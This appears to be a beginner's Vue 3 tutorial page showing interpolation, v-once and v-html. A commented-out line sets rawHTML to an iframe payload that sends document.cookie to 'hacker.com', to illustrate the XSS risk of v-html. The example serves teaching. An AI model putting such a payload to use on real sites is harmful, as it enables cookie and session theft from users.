<!DOCTYPE html>
<html lang="ko">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <script src="https://unpkg.com/vue@3/dist/vue.global.js"></script>
    <title>Vue Basics</title>
  </head>
  <body>
    <div id="app">
      <h1>{{ msg }}</h1>
      <h2 v-once>{{ msg }}</h2>
      <!-- <div v-html="rawHTML"></div> -->
      <!-- rawHTML tag will be rendered INSIDE the <div> tag  -->
    </div>
    <script>
      const App = {
        data() {
          return {
            msg: 'Hello Vue!!!!!',
            // rawHTML: `<iframe src="javascript:window.open('http://hacker.com?hack=' + document.cookie)"></iframe>` // leads to XSS error
            // rawHTML: '<h3 style="color: red">This is RAW!</h3>'
          }
        }
      }
      const vm = Vue.createApp(App).mount('#app')
    </script>
  </body>
</html>
